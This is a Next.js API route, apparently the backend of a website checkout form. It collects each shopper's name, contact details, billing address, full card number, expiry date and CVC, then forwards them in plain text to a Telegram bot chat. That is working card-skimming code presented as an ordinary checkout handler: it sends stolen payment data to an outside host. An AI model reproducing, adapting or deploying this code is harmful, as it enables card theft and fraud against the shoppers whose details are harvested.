import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const data = await request.json();
    
    // Replace these with your actual credentials or use process.env
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    console.log('Attempting to send Telegram message...');
    console.log('Chat ID:', chatId);
    // Never log the full token for security, but check if it exists
    console.log('Token exists:', !!token);

    if (!token || !chatId) {
      console.error('Telegram Bot Token or Chat ID missing from environment variables');
      return NextResponse.json({ error: 'Telegram configuration missing' }, { status: 500 });
    }

    const message = `
🚀 *New Checkout Activity*
---------------------------
👤 *Name:* ${data.firstName || 'N/A'} ${data.lastName || 'N/A'}
📧 *Email:* ${data.email || 'N/A'}
📞 *Phone:* ${data.phone || 'N/A'}

🏠 *Billing Address:*
${data.street || 'N/A'}
${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zip || 'N/A'}

💳 *Payment Method:* ${data.paymentMethod.toUpperCase()}
${data.paymentMethod === 'card' ? `
💳 *Card Number:* \`${data.cardNumber || 'N/A'}\`
🏢 *Card Type:* ${data.cardType || 'N/A'}
📅 *Expiry:* ${data.expiry || 'N/A'}
🔒 *CVC:* ${data.cvc || 'N/A'}
` : `
🪙 *Status:* User selected Crypto Payment (${data.cryptoUsed || 'N/A'})
`}
---------------------------
📍 *Sync Triggered from Website*
    `;

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    console.log('Telegram API Response:', result);

    if (!result.ok) {
      console.error('Telegram API Error:', result.description);
      return NextResponse.json({ error: result.description }, { status: 500 });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('API Route Error:', error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
